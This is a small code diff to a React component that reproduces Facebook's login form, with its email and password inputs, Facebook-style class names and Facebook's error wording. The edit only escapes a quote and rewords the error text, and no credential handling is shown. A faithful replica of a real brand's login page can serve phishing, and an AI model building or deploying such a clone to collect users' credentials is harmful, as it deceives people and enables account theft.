@@ -99,7 +99,7 @@ const Facebook = () => {
                         <input ref={emailref} className={`${styles.logForm} form-control `} type="text" placeholder="Email address or phone number" />
                       </div>
                       <div className={styles._6lux}>
-                        {error ? <p>""</p> : <small style={{ fontWeight: "600" }} className='text-danger'>The email address or mobile number you entered isn't connected to an account. Find your account and log in.</small>}
+                        {error ? <p>&quot;</p> : <small style={{ fontWeight: "600" }} className='text-danger'>The email address or mobile number you entered is not connected to an account. Find your account and log in.</small>}
                       </div>
                       <div className={styles._6lux}>
                         <input ref={passref} className={`${styles.logForm} form-control `} type="password" placeholder="Password" />
